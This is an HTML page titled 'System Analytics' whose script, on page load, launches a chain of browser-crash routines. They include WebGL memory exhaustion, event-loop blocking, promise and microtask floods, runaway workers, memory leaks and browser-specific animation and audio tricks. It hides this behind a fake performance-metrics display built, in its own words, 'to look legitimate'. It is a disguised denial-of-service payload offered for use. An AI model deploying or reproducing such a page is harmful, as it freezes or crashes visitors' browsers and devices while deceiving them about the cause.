<!DOCTYPE html>
<html>
<head>
    <title>System Analytics</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            overflow: hidden;
        }
    </style>
</head>
<body>
    <script>
        // ========== WEBGL CRASH ==========
        function webglCrash() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
                
                // Create massive texture that exceeds GPU memory
                const texture = gl.createTexture();
                gl.bindTexture(gl.TEXTURE_2D, texture);
                
                // Try to allocate impossibly large texture
                const size = 16384; // Maximum texture size
                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
                
                // Create too many shaders
                for (let i = 0; i < 1000; i++) {
                    const shader = gl.createShader(gl.VERTEX_SHADER);
                    gl.shaderSource(shader, 'void main(){}');
                    gl.compileShader(shader);
                }
            } catch(e) {}
        }

        // ========== MEMORY CORRUPTION SIMULATION ==========
        function memoryCorruption() {
            // Use ArrayBuffer to simulate memory corruption
            const buffer = new ArrayBuffer(1024 * 1024 * 100); // 100MB
            const view = new Uint32Array(buffer);
            
            // Write to random memory locations
            setInterval(() => {
                try {
                    for (let i = 0; i < view.length; i += 1000) {
                        view[i] = 0xDEADBEEF; // Magic number that might crash
                    }
                } catch(e) {}
            }, 100);
        }

        // ========== INFINITE RECURSION WITH PROMISES ==========
        function promiseCrash() {
            function recursivePromise() {
                return Promise.resolve().then(() => {
                    return recursivePromise();
                });
            }
            
            // Start multiple promise chains
            for (let i = 0; i < 10; i++) {
                recursivePromise();
            }
        }

        // ========== EVENT LOOP BLOCKAGE ==========
        function eventLoopCrash() {
            // Block event loop with synchronous operations
            setInterval(() => {
                const start = Date.now();
                while (Date.now() - start < 1000) {
                    // Block for 1 second
                    Math.sqrt(Math.random());
                }
            }, 10);
        }

        // ========== BROWSER-SPECIFIC VULNERABILITIES ==========
        function browserSpecificCrash() {
            // Chrome-specific: Excessive Promise microtasks
            if (navigator.userAgent.includes('Chrome')) {
                function microtaskFlood() {
                    Promise.resolve().then(microtaskFlood);
                }
                microtaskFlood();
            }
            
            // Firefox-specific: CSS animation bomb
            if (navigator.userAgent.includes('Firefox')) {
                const style = document.createElement('style');
                style.textContent = `
                    @keyframes crash {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(3600000deg); }
                    }
                    * { animation: crash 0.0001s infinite; }
                `;
                document.head.appendChild(style);
            }
            
            // Safari-specific: WebAudio crash
            if (navigator.userAgent.includes('Safari')) {
                try {
                    const context = new (window.AudioContext || window.webkitAudioContext)();
                    const oscillator = context.createOscillator();
                    const gain = context.createGain();
                    
                    oscillator.connect(gain);
                    gain.connect(context.destination);
                    
                    oscillator.frequency.setValueAtTime(0, context.currentTime);
                    gain.gain.setValueAtTime(1, context.currentTime);
                    
                    oscillator.start();
                } catch(e) {}
            }
        }

        // ========== STACK OVERFLOW WITH GENERATORS ==========
        function* stackOverflowGenerator() {
            yield* stackOverflowGenerator();
        }

        function generatorCrash() {
            try {
                const gen = stackOverflowGenerator();
                gen.next();
            } catch(e) {}
        }

        // ========== MEMORY LEAK WITH CLOSURES ==========
        function closureLeak() {
            let leaks = [];
            
            function createLeak() {
                const hugeArray = new Array(1000000).fill('LEAK');
                leaks.push(() => hugeArray); // Closure references huge array
            }
            
            setInterval(createLeak, 10);
        }

        // ========== DOM CORRUPTION ATTEMPT ==========
        function domCorruption() {
            // Try to corrupt DOM tree structure
            setInterval(() => {
                try {
                    const randomElement = document.body.children[
                        Math.floor(Math.random() * document.body.children.length)
                    ];
                    if (randomElement && randomElement.parentNode) {
                        randomElement.parentNode.removeChild(randomElement);
                        document.body.appendChild(randomElement);
                    }
                } catch(e) {}
            }, 1);
        }

        // ========== WEB WORKER CRASH ==========
        function workerCrash() {
            const workerCode = `
                while(true) {
                    // Infinite loop in worker
                    postMessage(Array(1000000).fill('CRASH'));
                }
            `;
            
            try {
                const blob = new Blob([workerCode], {type: 'application/javascript'});
                const worker = new Worker(URL.createObjectURL(blob));
                worker.onmessage = () => {};
            } catch(e) {}
        }

        // ========== REQUEST ANIMATION FRAME BOMB ==========
        function rafCrash() {
            function bomb() {
                requestAnimationFrame(() => {
                    // Heavy computation in RAF
                    for (let i = 0; i < 1000000; i++) {
                        Math.hypot(Math.random(), Math.random());
                    }
                    bomb();
                });
            }
            bomb();
        }

        // ========== START ALL CRASH METHODS ==========
        function startSmartCrash() {
            console.log("Starting smart crash sequence...");
            
            // Start with subtle methods first
            promiseCrash();
            eventLoopCrash();
            closureLeak();
            rafCrash();
            
            // Then move to more aggressive methods
            setTimeout(() => {
                webglCrash();
                memoryCorruption();
                browserSpecificCrash();
                generatorCrash();
                domCorruption();
                workerCrash();
            }, 3000);
            
            // Final nuclear option
            setTimeout(() => {
                // Try to trigger garbage collector issues
                const finalBomb = [];
                setInterval(() => {
                    finalBomb.push(new Array(1000000));
                }, 100);
            }, 10000);
            
            // Show fake analytics screen
            document.body.innerHTML = `
                <div style="padding: 20px;">
                    <h1>System Performance Analytics</h1>
                    <div id="metrics">Calculating system metrics...</div>
                </div>
            `;
            
            // Fake metrics to look legitimate
            setInterval(() => {
                document.getElementById('metrics').innerHTML = `
                    CPU Usage: ${Math.random() * 100}%<br>
                    Memory: ${Math.random() * 100}%<br>
                    GPU: ${Math.random() * 100}%<br>
                    Temperature: ${30 + Math.random() * 50}Â°C
                `;
            }, 1000);
        }

        // Start crash sequence
        window.onload = startSmartCrash;

    </script>
</body>
</html>